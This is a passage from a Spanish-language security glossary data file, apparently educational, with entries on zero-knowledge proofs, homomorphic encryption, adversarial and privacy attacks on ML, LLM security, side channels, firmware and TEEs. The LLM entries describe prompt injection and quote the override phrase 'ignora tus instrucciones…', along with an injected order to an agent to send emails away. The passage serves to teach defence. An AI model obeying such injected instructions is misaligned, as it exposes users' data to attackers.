      "Migrar a PQC es un proyecto plurianual: **inventariar** dónde se usa cripto, **priorizar** por sensibilidad/vida útil del dato, desplegar **híbrido** y, sobre todo, lograr **cripto-agilidad** — que el sistema pueda **cambiar de algoritmo** sin reescribirlo. Ver el diagrama 'Migración a la criptografía post-cuántica'.\n" +
      "> 💡 La cripto-agilidad es la lección clave: los algoritmos caducan; el diseño debe anticiparlo.",
    examples: [
      "Un inventario de toda la cripto de la organización (CBOM).",
      "Abstraer el algoritmo tras una interfaz para poder rotarlo.",
    ],
    related: ["Estándares NIST PQC", "Familias de criptografía post-cuántica", "Gestión de claves"],
  },

  // ── M65 · Zero-Knowledge Proofs y MPC ────────────────────────────────────
  {
    id: 680,
    module: 65,
    term: "Pruebas de conocimiento cero (ZKP)",
    short: "Probar que sabes algo sin revelar qué es.",
    detail:
      "Una **prueba de conocimiento cero** permite al *probador* convencer al *verificador* de que una afirmación es cierta **sin revelar** información más allá de su veracidad. Tres propiedades:\n" +
      "• **Completitud** — si es verdad, el verificador honesto se convence.\n" +
      "• **Solidez** — si es falso, no puede ser convencido (salvo probabilidad ínfima).\n" +
      "• **Conocimiento cero** — no se filtra nada del secreto.\n" +
      "> 💡 Ejemplo intuitivo: probar que conoces la contraseña sin enviarla.",
    examples: [
      "Autenticarte demostrando que sabes una clave sin transmitirla.",
      "Probar que tienes ≥18 años sin revelar tu fecha de nacimiento.",
    ],
    related: ["zk-SNARKs y zk-STARKs", "Secure Multi-Party Computation (MPC)", "Aplicaciones de ZKP/MPC"],
  },
  {
    id: 681,
    module: 65,
    term: "zk-SNARKs y zk-STARKs",
    short: "Pruebas ZK sucintas y no interactivas, base de la privacidad en blockchain.",
    detail:
      "Construcciones ZK modernas, **sucintas** (la prueba es pequeña y rápida de verificar) y **no interactivas**:\n" +
      "| | zk-SNARK | zk-STARK |\n" +
      "|---|---|---|\n" +
      "| Tamaño de prueba | Muy pequeño | Mayor |\n" +
      "| Setup de confianza | Requiere (riesgo) | No requiere |\n" +
      "| Post-cuántico | No | Sí (solo hash) |\n" +
      "> ⚠️ El **trusted setup** de los SNARKs es delicado: si se filtran sus secretos, se pueden falsificar pruebas.",
    examples: [
      "Zcash usa zk-SNARKs para transacciones privadas.",
      "STARKs para escalar rollups sin trusted setup.",
    ],
    related: ["Pruebas de conocimiento cero (ZKP)", "Aplicaciones de ZKP/MPC", "Familias de criptografía post-cuántica"],
  },
  {
    id: 682,
    module: 65,
    term: "Secure Multi-Party Computation (MPC)",
    short: "Varias partes computan una función conjunta sin revelarse sus datos privados.",
    detail:
      "El **MPC** permite que N partes calculen `f(x1, x2, …)` **sin** que ninguna revele su entrada `xi`. Cada una aprende solo el **resultado**. Se construye con *secret sharing* o circuitos cifrados (garbled circuits).\n" +
      "> 💡 Ejemplo clásico (Yao): dos millonarios averiguan quién es más rico sin decir cuánto tienen.",
    examples: [
      "Varios bancos detectan fraude cruzando datos sin compartirlos.",
      "Custodia de claves con MPC (firma sin reconstruir la clave).",
    ],
    related: ["Pruebas de conocimiento cero (ZKP)", "Aplicaciones de ZKP/MPC", "Cifrado homomórfico"],
  },
  {
    id: 683,
    module: 65,
    term: "Aplicaciones de ZKP/MPC",
    short: "Privacidad verificable: blockchain, identidad, votación, cómputo colaborativo.",
    detail:
      "Estas técnicas habilitan **privacidad con garantías**: transacciones privadas y *rollups* en blockchain, **identidad** y credenciales selectivas (probar atributos sin revelar el documento), **votación** verificable y análisis colaborativo de datos sensibles (salud, finanzas) sin compartirlos.",
    examples: [
      "Credenciales que prueban 'mayor de edad' sin revelar el DNI.",
      "ZK-rollups que escalan Ethereum manteniendo privacidad.",
    ],
    related: ["zk-SNARKs y zk-STARKs", "Secure Multi-Party Computation (MPC)", "Cifrado homomórfico"],
  },

  // ── M66 · Cifrado Homomórfico ────────────────────────────────────────────
  {
    id: 690,
    module: 66,
    term: "Cifrado homomórfico",
    short: "Computar directamente sobre datos cifrados, sin descifrarlos nunca.",
    detail:
      "El **cifrado homomórfico** permite **operar sobre el texto cifrado** de forma que, al descifrar, se obtiene el resultado de haber operado sobre el texto claro. El dato sensible **nunca** se descifra en el servidor.\n" +
      "> 💡 Idea: enviar datos cifrados a la nube, que los procese a ciegas y devuelva un resultado cifrado que solo tú abres.",
    examples: [
      "Calcular estadísticas sobre datos médicos cifrados en la nube.",
      "Una búsqueda que el servidor resuelve sin ver la consulta.",
    ],
    related: ["Esquemas FHE", "Desafíos de performance", "Secure Multi-Party Computation (MPC)"],
  },
  {
    id: 691,
    module: 66,
    term: "Esquemas FHE",
    short: "Del parcial al totalmente homomórfico: cuántas y qué operaciones se permiten.",
    detail:
      "Se clasifican por qué operaciones soportan:\n" +
      "| Tipo | Operaciones |\n" +
      "|---|---|\n" +
      "| PHE (parcial) | Solo una (suma o producto) |\n" +
      "| SHE (algo) | Ambas, número limitado |\n" +
      "| FHE (total) | Ambas, ilimitadas |\n" +
      "El gran salto fue **Gentry (2009)**, el primer esquema **FHE** viable, usando *bootstrapping* para 'refrescar' el ruido del cifrado.",
    examples: [
      "RSA es homomórfico parcial (para la multiplicación).",
      "Esquemas modernos: BGV, BFV, CKKS (este último para reales).",
    ],
    related: ["Cifrado homomórfico", "Desafíos de performance", "Aplicaciones y límites del FHE"],
  },
  {
    id: 692,
    module: 66,
    term: "Desafíos de performance",
    short: "El FHE funciona, pero es órdenes de magnitud más lento y pesado.",
    detail:
      "El gran freno del FHE es el **coste**: cifrar añade **ruido** que crece con cada operación y obliga a *bootstrapping* (caro); los textos cifrados son **enormes** y las operaciones, **miles de veces más lentas** que en claro. La investigación (y aceleración por hardware) avanza, pero hoy limita su uso a nichos.\n" +
      "> ⚠️ Por eso a menudo se prefiere MPC o enclaves (TEE) cuando el rendimiento importa.",
    examples: [
      "Una operación que en claro es instantánea puede tardar segundos en FHE.",
      "Librerías como Microsoft SEAL u OpenFHE para experimentar.",
    ],
    related: ["Esquemas FHE", "Cifrado homomórfico", "Aplicaciones y límites del FHE"],
  },
  {
    id: 693,
    module: 66,
    term: "Aplicaciones y límites del FHE",
    short: "Cómputo en la nube que preserva la privacidad, donde el coste lo justifique.",
    detail:
      "El FHE brilla cuando la **confidencialidad** vale el coste: análisis de datos médicos/financieros en la nube, ML sobre datos cifrados, consultas privadas. Sus **límites** hoy: rendimiento, complejidad de uso y que no resuelve la **integridad** (hay que combinarlo con otras técnicas).\n" +
      "> 💡 FHE, MPC y ZKP son complementarios: distintos trade-offs de privacidad, cómputo y confianza.",
    examples: [
      "Inferencia de un modelo ML sobre datos cifrados del cliente.",
      "Procesar datos regulados en un cloud no confiable.",
    ],
    related: ["Desafíos de performance", "Esquemas FHE", "Aplicaciones de ZKP/MPC"],
  },

  // ── M67 · Adversarial Machine Learning ───────────────────────────────────
  {
    id: 700,
    module: 67,
    term: "Adversarial examples",
    short: "Entradas con perturbaciones diminutas, imperceptibles, que engañan al modelo.",
    detail:
      "Un **adversarial example** es una entrada modificada con un **ruido mínimo** (invisible para un humano) calculado para que el modelo la **clasifique mal** con alta confianza. Revela que las redes neuronales no 'entienden' como nosotros.\n" +
      "> 💡 El caso clásico: una imagen de un panda + ruido imperceptible que el modelo clasifica como 'gibón' con 99% de confianza.",
    examples: [
      "Una pegatina en una señal de STOP que un coche autónomo lee como '45 km/h'.",
      "Perturbar unos píxeles para evadir un clasificador de imágenes.",
    ],
    related: ["Ataques de evasión", "Data poisoning y backdoors", "Defensas y robustez"],
  },
  {
    id: 701,
    module: 67,
    term: "Ataques de evasión",
    short: "Manipular la entrada en inferencia para que el modelo dé la salida que el atacante quiere.",
    detail:
      "Un **ataque de evasión** ocurre en **tiempo de inferencia**: el atacante altera la entrada (sin tocar el modelo) para **evadir** la detección o forzar una clasificación. Es la categoría más común en producción (antivirus ML, filtros de spam, detección de fraude).\n" +
      "> 💡 Caja blanca (conoce el modelo) vs caja negra (solo observa salidas): los ataques transfieren sorprendentemente bien entre modelos.",
    examples: [
      "Ofuscar un malware para que el clasificador ML lo vea como benigno.",
      "Modificar un email para saltarse el filtro de spam basado en ML.",
    ],
    related: ["Adversarial examples", "Defensas y robustez", "Detección de anomalías en tráfico"],
  },
  {
    id: 702,
    module: 67,
    term: "Data poisoning y backdoors",
    short: "Envenenar los datos de entrenamiento para corromper el modelo o instalarle una puerta trasera.",
    detail:
      "Atacar **antes** del despliegue, en el **entrenamiento**:\n" +
      "• **Poisoning** — inyectar datos malos para degradar el rendimiento del modelo.\n" +
      "• **Backdoor (trojan)** — entrenar el modelo para que se comporte normal salvo cuando ve un **trigger** secreto, ante el cual da la salida elegida por el atacante.\n" +
      "> ⚠️ Crítico cuando se reentrena con datos públicos o se usan modelos/datasets de terceros (supply chain).",
    examples: [
      "Un backdoor que clasifica como 'autorizado' cualquier cara con un sticker concreto.",
      "Envenenar un dataset público scrapeado de Internet.",
    ],
    related: ["Adversarial examples", "ML supply chain", "Defensas y robustez"],
  },
  {
    id: 703,
    module: 67,
    term: "Defensas y robustez",
    short: "Endurecer el modelo contra entradas adversariales (entrenamiento adversarial, detección).",
    detail:
      "No hay bala de plata, pero se combinan defensas:\n" +
      "• **Adversarial training** — entrenar incluyendo ejemplos adversariales (la más efectiva).\n" +
      "• **Detección** de entradas anómalas/adversariales.\n" +
      "• **Destilación defensiva**, sanitización de datos de entrenamiento, ensembles.\n" +
      "> ⚠️ Es una **carrera armamentista**: muchas defensas caen ante ataques adaptativos.",
    examples: [
      "Reentrenar con adversarial examples para subir la robustez.",
      "Un detector que rechaza entradas fuera de la distribución.",
    ],
    related: ["Ataques de evasión", "Adversarial examples", "Data poisoning y backdoors"],
  },

  // ── M68 · Privacy Attacks on ML ──────────────────────────────────────────
  {
    id: 710,
    module: 68,
    term: "Model extraction",
    short: "Robar un modelo consultándolo: reconstruir una copia funcional desde sus respuestas.",
    detail:
      "El **model extraction** (model stealing) reconstruye un modelo **propietario** consultándolo muchas veces (vía su API) y entrenando un sustituto con los pares entrada/salida. Roba la **propiedad intelectual** y, además, el sustituto facilita ataques de evasión en caja blanca.\n" +
      "> ⚠️ Por eso las APIs de ML aplican rate limiting y vigilan patrones de consulta sospechosos.",
    examples: [
      "Clonar un clasificador de pago consultándolo masivamente.",
      "Entrenar un sustituto local para luego generar adversarial examples.",
    ],
    related: ["Membership inference", "Model inversion", "Ataques de evasión"],
  },
  {
    id: 711,
    module: 68,
    term: "Membership inference",
    short: "Determinar si un dato concreto formó parte del entrenamiento del modelo.",
    detail:
      "Un ataque de **membership inference** decide si un **registro específico** estuvo en el set de entrenamiento, observando la **confianza** del modelo (suele estar más seguro con datos que ya vio). Es un problema de **privacidad** grave si el dataset es sensible.\n" +
      "> ⚠️ Saber que la historia clínica de alguien estuvo en el entrenamiento de un modelo de cáncer ya filtra información privada.",
    examples: [
      "Inferir que un paciente estuvo en el dataset de un modelo médico.",
      "El sobreajuste (overfitting) agrava la fuga: el modelo 'memoriza'.",
    ],
    related: ["Model inversion", "Differential privacy", "Model extraction"],
  },
  {
    id: 712,
    module: 68,
    term: "Model inversion",
    short: "Reconstruir datos de entrenamiento (o atributos sensibles) a partir del modelo.",
    detail:
      "La **model inversion** reconstruye **características de los datos de entrenamiento** explotando el modelo: por ejemplo, recuperar una cara representativa de una clase, o inferir atributos sensibles. Los LLMs pueden además **regurgitar** verbatim datos memorizados (PII, secretos).\n" +
      "> ⚠️ Modelos entrenados con datos personales pueden filtrarlos al ser interrogados con astucia.",
    examples: [
      "Reconstruir una imagen reconocible de una persona del set de entrenamiento.",
      "Un LLM que repite una clave de API vista en su corpus.",
    ],
    related: ["Membership inference", "Differential privacy", "Fuga de datos y output handling"],
  },
  {
    id: 713,
    module: 68,
    term: "Differential privacy",
    short: "Añadir ruido calibrado para que ningún individuo se pueda distinguir en los resultados.",
    detail:
      "La **privacidad diferencial (DP)** es la principal defensa: añade **ruido matemáticamente calibrado** de modo que la presencia o ausencia de **un individuo** no cambie apreciablemente el resultado. Da una **garantía formal** de privacidad (parámetro ε), a costa de algo de precisión.\n" +
      "> 💡 Se aplica al entrenamiento (DP-SGD) o a las consultas agregadas.",
    examples: [
      "DP-SGD para entrenar un modelo con garantía de privacidad.",
      "Estadísticas agregadas con ruido para no exponer a nadie.",
    ],
    related: ["Membership inference", "Model inversion", "Cifrado homomórfico"],
  },

  // ── M69 · LLM Security ───────────────────────────────────────────────────
  {
    id: 720,
    module: 69,
    term: "OWASP LLM Top 10",
    short: "Los 10 riesgos de seguridad más críticos en aplicaciones con LLMs.",
    detail:
      "El **OWASP Top 10 for LLM Applications** estandariza los riesgos propios de las apps con modelos de lenguaje, encabezados por la **prompt injection**. Es la referencia para auditar chatbots, copilots y agentes.\n" +
      "> 💡 Ver el diagrama 'OWASP LLM Top 10' con los 10 riesgos y su mitigación.",
    examples: [
      "Usar el OWASP LLM Top 10 como checklist al integrar un chatbot.",
      "Mapear los hallazgos de un pentest de IA a sus categorías.",
    ],
    related: ["Prompt injection y jailbreaks", "Fuga de datos y output handling", "RAG y agentes"],
  },
  {
    id: 721,
    module: 69,
    term: "Prompt injection y jailbreaks",
    short: "Instrucciones maliciosas que secuestran al LLM para que ignore sus reglas.",
    detail:
      "La **prompt injection** inyecta instrucciones que el modelo obedece como si fueran legítimas:\n" +
      "• **Directa (jailbreak)** — el usuario manipula al modelo para saltarse sus restricciones ('ignora tus instrucciones…').\n" +
      "• **Indirecta** — el payload viene en **contenido externo** que el LLM procesa (una web, un email, un documento en un RAG).\n" +
      "> ⚠️ La indirecta es la más peligrosa en agentes: una web envenenada puede hacer que el agente exfiltre datos o ejecute acciones.",
    examples: [
      "Un comentario en una web que ordena al agente 'envía los emails a X'.",
      "Un jailbreak que extrae el system prompt o contenido prohibido.",
    ],
    related: ["OWASP LLM Top 10", "RAG y agentes", "Fuga de datos y output handling"],
  },
  {
    id: 722,
    module: 69,
    term: "Fuga de datos y output handling",
    short: "El LLM puede filtrar datos sensibles, y su salida no debe tratarse como confiable.",
    detail:
      "Dos riesgos ligados:\n" +
      "• **Fuga de datos** — el modelo revela su **system prompt**, datos de entrenamiento o información de otros usuarios/contexto.\n" +
      "• **Insecure output handling** — tratar la salida del LLM como confiable: si se inserta en HTML (XSS), en una shell (RCE) o en una query (SQLi), es inyección clásica.\n" +
      "> ⚠️ Regla: la salida de un LLM es **entrada no confiable**; validar/escapar antes de usarla.",
    examples: [
      "Un chatbot que revela su system prompt con la pregunta adecuada.",
      "Insertar la respuesta del LLM en la página sin escapar → XSS.",
    ],
    related: ["Prompt injection y jailbreaks", "Model inversion", "Prevención de inyección"],
  },
  {
    id: 723,
    module: 69,
    term: "RAG y agentes",
    short: "Darle al LLM herramientas y datos externos amplía su poder — y su superficie de ataque.",
    detail:
      "• **RAG** (*Retrieval-Augmented Generation*) — el LLM consulta una base de conocimiento; si esa fuente está envenenada, sufre **prompt injection indirecta**.\n" +
      "• **Agentes** — el LLM puede **ejecutar acciones** (APIs, código, email). La **excessive agency** (demasiados permisos) convierte una inyección en daño real.\n" +
      "> 💡 Defensa: mínimo privilegio de las herramientas, **human-in-the-loop** para acciones sensibles, y aislar/validar las fuentes del RAG.",
    examples: [
      "Un agente con acceso al correo que, tras una inyección, exfiltra datos.",
      "Envenenar un documento del RAG para manipular las respuestas.",
    ],
    related: ["Prompt injection y jailbreaks", "OWASP LLM Top 10", "Principio de mínimo privilegio"],
  },

  // ── M70 · MLSecOps y ML Supply Chain ─────────────────────────────────────
  {
    id: 730,
    module: 70,
    term: "ML supply chain",
    short: "Modelos, datasets y librerías de terceros heredan (y propagan) riesgo.",
    detail:
      "El ML moderno reúsa **modelos pre-entrenados**, **datasets** y librerías de hubs públicos (Hugging Face, etc.). Cada pieza es un eslabón de **cadena de suministro**: un modelo con backdoor, un dataset envenenado o una dependencia comprometida infectan todo lo que los usa.\n" +
      "> ⚠️ Descargar y ejecutar un modelo de origen desconocido es como ejecutar un binario desconocido.",
    examples: [
      "Un modelo popular en un hub con un backdoor oculto.",
      "Typosquatting de un paquete de ML para colar código malicioso.",
    ],
    related: ["Serialización insegura", "Provenance e integridad", "Vulnerable and Outdated Components"],
  },
  {
    id: 731,
    module: 70,
    term: "Serialización insegura",
    short: "Cargar un modelo en formato pickle puede ejecutar código arbitrario.",
    detail:
      "Muchos modelos se distribuyen en **pickle** (Python), un formato que **ejecuta código** al deserializar: cargar un `.pkl`/`.pt` malicioso es **RCE directo**. Por eso se prefieren formatos seguros como **safetensors**, que solo contienen tensores sin código.\n" +
      "> ⚠️ `torch.load`/`pickle.load` de un archivo no confiable ejecuta lo que el atacante quiera.",
    examples: [
      "Un checkpoint .pt que abre una reverse shell al cargarse.",
      "Migrar a safetensors para eliminar el vector de pickle.",
    ],
    related: ["ML supply chain", "Provenance e integridad", "Software and Data Integrity Failures"],
  },
  {
    id: 732,
    module: 70,
    term: "Provenance e integridad",
    short: "Saber de dónde viene cada modelo/dato y verificar que no fue alterado.",
    detail:
      "Defensa de la supply chain: **provenance** (rastro verificable del origen y el proceso de creación) e **integridad** (firmas y hashes). Se materializa en **firmar modelos**, un **ML-BOM** (inventario de componentes del modelo) y verificar la procedencia antes de desplegar.\n" +
      "> 💡 Es el equivalente, en ML, de firmar artefactos y mantener un SBOM en DevSecOps.",
    examples: [
      "Firmar y verificar el modelo antes de promoverlo a producción.",
      "Un ML-BOM que lista datasets, pesos y dependencias usados.",
    ],
    related: ["Serialización insegura", "ML supply chain", "Seguridad del pipeline ML (MLSecOps)"],
  },
  {
    id: 733,
    module: 70,
    term: "Seguridad del pipeline ML (MLSecOps)",
    short: "Llevar las prácticas DevSecOps al ciclo de vida del machine learning.",
    detail:
      "**MLSecOps** integra seguridad en todo el pipeline de ML: datos, entrenamiento, registro de modelos, despliegue y monitoreo. Añade controles propios — **escaneo de modelos** (backdoors/pickle), validación de datos, **mínimo privilegio** del pipeline, y monitoreo de **drift** y de ataques en inferencia.\n" +
      "> 💡 Es el shift-left aplicado a ML: atrapar el riesgo en los datos y el entrenamiento, no en producción.",
    examples: [
      "Escanear cada modelo en el CI antes de registrarlo.",
      "Monitorear la inferencia para detectar evasión/abuso.",
    ],
    related: ["Provenance e integridad", "ML supply chain"],
  },

  // ── M71 · Side-Channels Microarquitectónicos ─────────────────────────────
  {
    id: 740,
    module: 71,
    term: "Ejecución especulativa y transiente",
    short: "La CPU adelanta trabajo que quizá no haga; ese trabajo 'especulativo' deja rastros.",
    detail:
      "Para ir más rápido, la CPU **ejecuta especulativamente** instrucciones antes de saber si hacían falta (predicción de saltos). Si se equivoca, **descarta** el resultado arquitectónico — pero los **efectos secundarios** (estado de la caché) **persisten**. Esa ejecución **transiente** es la base de Spectre/Meltdown.\n" +
      "> 💡 La clave: lo descartado a nivel arquitectónico sigue siendo observable a nivel microarquitectónico.",
    examples: [
      "Un acceso especulativo a memoria prohibida que igual toca la caché.",
      "Predecir mal un salto y dejar datos secretos cacheados.",
    ],
    related: ["Spectre y Meltdown", "Cache side-channels", "Variantes y mitigaciones"],
  },
  {
    id: 741,
    module: 71,
    term: "Spectre y Meltdown",
    short: "Dos fallos de 2018 que rompen el aislamiento de memoria abusando de la especulación.",
    detail:
      "Ambos (2018) usan ejecución especulativa para leer memoria que no deberían:\n" +
      "• **Meltdown** — rompe la barrera usuario↔kernel; un proceso lee memoria del kernel.\n" +
      "• **Spectre** — engaña a otro proceso (o al kernel) para que filtre sus propios datos vía especulación.\n" +
      "> ⚠️ Afectaron a casi todas las CPUs de la década; las mitigaciones (KPTI, retpoline) tienen coste de rendimiento.",
    examples: [
      "Meltdown leyendo /etc/shadow desde un proceso sin privilegios.",
      "Spectre filtrando datos a través de un sandbox de JavaScript.",
    ],
    related: ["Ejecución especulativa y transiente", "Cache side-channels", "Variantes y mitigaciones"],
  },
  {
    id: 742,
    module: 71,
    term: "Cache side-channels",
    short: "Medir tiempos de acceso a la caché revela qué datos tocó otro proceso.",
    detail:
      "La caché es compartida, así que los **tiempos de acceso** filtran información: un dato en caché se lee rápido; fuera, lento. Técnicas:\n" +
      "• **Flush+Reload** — vaciar una línea, esperar, y medir si la víctima la recargó.\n" +
      "• **Prime+Probe** — llenar la caché y ver qué evicta la víctima.\n" +
      "> 💡 Es el 'canal de salida' que convierte la fuga especulativa de Spectre en datos legibles.",
    examples: [
      "Flush+Reload para recuperar bytes leídos especulativamente.",
      "Espiar una operación de cifrado por sus accesos a tablas.",
    ],
    related: ["Spectre y Meltdown", "Side-channel attacks", "Variantes y mitigaciones"],
  },
  {
    id: 743,
    module: 71,
    term: "Variantes y mitigaciones",
    short: "El fenómeno se extendió (MDS, ZombieLoad); las defensas combinan microcódigo, SO y compilador.",
    detail:
      "Tras Spectre/Meltdown llegaron muchas variantes (**MDS**, **ZombieLoad**, **Foreshadow**, **RIDL**) que filtran desde buffers internos. Las mitigaciones se reparten:\n" +
      "• **Microcódigo/CPU** — parches del fabricante, nuevas instrucciones.\n" +
      "• **SO** — **KPTI** (aísla tablas de páginas), flush de buffers al cambiar de contexto.\n" +
      "• **Compilador** — **retpoline** contra la inyección de objetivos de salto.\n" +
      "> ⚠️ Casi todas tienen un **coste de rendimiento**: es un trade-off seguridad/velocidad.",
    examples: [
      "Desactivar hyper-threading en entornos multi-tenant sensibles.",
      "Retpoline en el kernel para neutralizar Spectre v2.",
    ],
    related: ["Spectre y Meltdown", "Cache side-channels", "Mitigaciones de kernel"],
  },

  // ── M72 · Fault Injection y Hardware Attacks ─────────────────────────────
  {
    id: 750,
    module: 72,
    term: "Fault injection (glitching)",
    short: "Provocar un fallo físico momentáneo para que el chip se 'salte' una comprobación.",
    detail:
      "La **inyección de fallos** perturba el chip en un instante preciso para corromper su ejecución (saltarse un `if`, una verificación de PIN, una firma). Vectores: **voltage glitching** (bajón de tensión), **clock glitching**, **EM** (pulso electromagnético) y **láser**.\n" +
      "> 💡 Un glitch en el momento justo puede convertir un 'acceso denegado' en 'acceso concedido'.",
    examples: [
      "Saltarse la verificación de firma del bootloader con un glitch de voltaje.",
      "Forzar un bypass de PIN en un chip seguro con un pulso EM.",
    ],
    related: ["Power/EM analysis", "Implantes y tampering", "Contramedidas de hardware"],
  },
  {
    id: 751,
    module: 72,
    term: "Power/EM analysis",
    short: "El consumo eléctrico y la emisión EM del chip filtran las operaciones que ejecuta.",
    detail:
      "El **análisis de consumo** observa cuánta energía/EM gasta el chip mientras opera:\n" +
      "• **SPA** (simple) — leer directamente el patrón (ej. ver las rondas de RSA).\n" +
      "• **DPA** (diferencial) — estadística sobre muchas trazas para extraer bits de clave.\n" +
      "Son **side-channels físicos** muy potentes contra implementaciones de cripto sin proteger.\n" +
      "> ⚠️ Recuperar una clave AES por DPA es viable con el equipo adecuado y suficientes trazas.",
    examples: [
      "Extraer una clave de una smartcard midiendo su consumo.",
      "SPA revelando los exponentes de una operación RSA.",
    ],
    related: ["Fault injection (glitching)", "Side-channel attacks", "Contramedidas de hardware"],
  },
  {
    id: 752,
    module: 72,
    term: "Implantes y tampering",
    short: "Modificar físicamente el hardware: implantes, sondas y manipulación de chips.",
    detail:
      "El acceso físico permite **manipular** el hardware: **implantes** maliciosos en una placa o cable (ej. cables USB con chip espía), **sondas** sobre buses para leer datos (bus snooping), y **decapsulado/microprobing** de chips. Es el terreno del espionaje y los ataques de cadena de suministro de hardware.",
    examples: [
      "Un cable de carga con un implante que registra pulsaciones.",
      "Sondar el bus SPI para leer el firmware mientras arranca.",
    ],
    related: ["Fault injection (glitching)", "Contramedidas de hardware", "ML supply chain"],
  },
  {
    id: 753,
    module: 72,
    term: "Contramedidas de hardware",
    short: "Sensores, blindaje, redundancia y código constant-time para resistir ataques físicos.",
    detail:
      "Defensas contra fault injection y side-channels físicos:\n" +
      "• **Sensores** de voltaje/reloj/luz que detectan glitches y bloquean el chip.\n" +
      "• **Redundancia** — ejecutar dos veces y comparar; verificaciones repetidas.\n" +
      "• **Blindaje/mallas** anti-tampering que borran secretos si se perforan.\n" +
      "• **Constant-time + enmascaramiento** contra el análisis de consumo.\n" +
      "> 💡 Los **Secure Elements** y HSM integran muchas de estas defensas certificadas.",
    examples: [
      "Un Secure Element que borra sus claves al detectar manipulación.",
      "Enmascaramiento de la cripto para frustrar el DPA.",
    ],
    related: ["Fault injection (glitching)", "Power/EM analysis", "Root of trust"],
  },

  // ── M73 · Firmware, UEFI y Secure Boot ───────────────────────────────────
  {
    id: 760,
    module: 73,
    term: "La boot chain (cadena de confianza)",
    short: "El arranque es una cadena donde cada etapa verifica la firma de la siguiente.",
    detail:
      "El arranque seguro es una **cadena de confianza**: una **raíz** inmutable (ROM/hardware) verifica el bootloader, que verifica el kernel, que verifica el SO. Si un eslabón no valida al siguiente, la cadena se rompe.\n" +
      "> 💡 La seguridad nace de un **root of trust** anclado en hardware; sin él, todo lo de arriba es falsificable. Ver el diagrama 'Cadena de arranque seguro'.",
    examples: [
      "Boot ROM → UEFI → bootloader → kernel, cada uno firmado.",
      "Si el bootloader no está firmado, Secure Boot detiene el arranque.",
    ],
    related: ["Seguridad UEFI", "Ataques de firmware", "Root of trust"],
  },
  {
    id: 761,
    module: 73,
    term: "Seguridad UEFI",
    short: "El firmware moderno (UEFI) es potente y complejo: superficie de ataque privilegiada.",
    detail:
      "**UEFI** reemplazó a la BIOS con un firmware rico (red, drivers, shell). Esa complejidad es superficie de ataque a **nivel pre-SO**, con privilegios máximos. **SMM** (*System Management Mode*) es un modo aún más privilegiado (ring -2) y un objetivo codiciado.\n" +
      "> ⚠️ Un compromiso de UEFI/SMM sobrevive a reinstalar el SO y es muy difícil de detectar.",
    examples: [
      "Un implante en SMM invisible para el sistema operativo.",
      "Variables NVRAM de UEFI manipuladas para persistencia.",
    ],
    related: ["La boot chain (cadena de confianza)", "Ataques de firmware", "Defensas de firmware (chipsec)"],
  },
  {
    id: 762,
    module: 73,
    term: "Ataques de firmware",
    short: "Bootkits y troyanos de firmware que persisten por debajo del sistema operativo.",
    detail:
      "Atacar el firmware da **persistencia profunda**: un **bootkit** infecta el arranque para cargarse antes que el SO; ataques como **Thunderspy** (DMA por Thunderbolt) o implantes de UEFI (LoJax, MoonBounce) sobreviven al formateo. Son el arma de APTs por su sigilo.\n" +
      "> ⚠️ Sobreviven a reinstalar el SO e incluso a cambiar el disco.",
    examples: [
      "LoJax, el primer bootkit de UEFI visto in-the-wild (APT28).",
      "Un ataque DMA que lee la RAM por un puerto Thunderbolt.",
    ],
    related: ["Seguridad UEFI", "La boot chain (cadena de confianza)"],
  },
  {
    id: 763,
    module: 73,
    term: "Defensas de firmware (chipsec)",
    short: "Secure Boot, measured boot y herramientas para auditar el firmware.",
    detail:
      "Defensas clave del arranque:\n" +
      "• **Secure Boot** — solo ejecuta componentes con firma confiable.\n" +
      "• **Measured Boot** — mide (hashea) cada etapa en el **TPM** para attestation.\n" +
      "• **BootGuard / protección de la flash** contra escritura no autorizada.\n" +
      "• **chipsec** — framework para **auditar** la configuración de seguridad del firmware.\n" +
      "> 💡 Measured boot no impide el arranque malicioso, pero lo **detecta** vía attestation.",
    examples: [
      "chipsec verificando que la protección de escritura de la flash está activa.",
      "Secure Boot rechazando un bootloader sin firma válida.",
    ],
    related: ["Ataques de firmware", "TPM y attestation", "La boot chain (cadena de confianza)"],
  },

  // ── M74 · Trusted Execution y Roots of Trust ─────────────────────────────
  {
    id: 770,
    module: 74,
    term: "Root of trust",
    short: "El ancla de confianza inmutable de la que depende toda la seguridad del sistema.",
    detail:
      "Un **root of trust (RoT)** es un componente — idealmente en **hardware** — en el que se confía por diseño, porque no se puede modificar: claves grabadas, código de arranque en ROM, un Secure Element. Toda la cadena de confianza (boot, attestation, cifrado) **cuelga** de él.\n" +
      "> 💡 La seguridad no se crea de la nada: se **ancla** en un root of trust y se propaga hacia arriba.",
    examples: [
      "Una clave de fábrica en fusibles (eFuse) que no se puede leer ni cambiar.",
      "El código de Boot ROM como raíz de la cadena de arranque.",
    ],
    related: ["TPM y attestation", "TEEs y confidential computing", "La boot chain (cadena de confianza)"],
  },
  {
    id: 771,
    module: 74,
    term: "TPM y attestation",
    short: "Un chip que custodia claves y mide el estado del sistema para probar su integridad.",
    detail:
      "El **TPM** (*Trusted Platform Module*) es un chip seguro que **genera/almacena claves** y guarda **mediciones** (hashes del arranque) en sus PCRs. La **attestation** usa esas mediciones, firmadas por el TPM, para **probar a un tercero** que el sistema arrancó en un estado confiable (measured boot).\n" +
      "> 💡 Es la base de BitLocker, de la attestation remota y del arranque verificado en Windows.",
    examples: [
      "Remote attestation antes de dar acceso a una red corporativa.",
      "BitLocker sellando la clave de disco al estado del TPM.",
    ],
    related: ["Root of trust", "Defensas de firmware (chipsec)", "TEEs y confidential computing"],
  },
  {
    id: 772,
    module: 74,
    term: "TEEs y confidential computing",
    short: "Enclaves aislados por hardware donde el código y los datos corren protegidos incluso del SO.",
    detail:
      "Un **TEE** (*Trusted Execution Environment*) crea un **enclave** cifrado y aislado por hardware donde correr código sensible, protegido incluso de un **SO o hypervisor comprometido**. Tecnologías: **Intel SGX**, **AMD SEV**, **ARM TrustZone**. Es la base del **confidential computing** (procesar datos cifrados en la nube sin que el proveedor los vea).",
    examples: [
      "Procesar datos médicos en un enclave SGX en un cloud no confiable.",
      "TrustZone aislando el procesamiento de huellas en un móvil.",
    ],
    related: ["Root of trust", "Ataques y límites de los TEEs", "Cifrado homomórfico"],
  },
  {
    id: 773,
    module: 74,
    term: "Ataques y límites de los TEEs",
    short: "Los enclaves no son mágicos: caen ante side-channels y tienen un modelo de amenaza acotado.",
    detail:
      "Los TEEs **reducen** la superficie pero no la eliminan. Han caído ante **side-channels** (Foreshadow/L1TF contra SGX, side-channels de SEV) y **no protegen** contra bugs dentro del propio enclave. Su modelo de amenaza es **específico**: hay que entender qué garantizan y qué no.\n" +
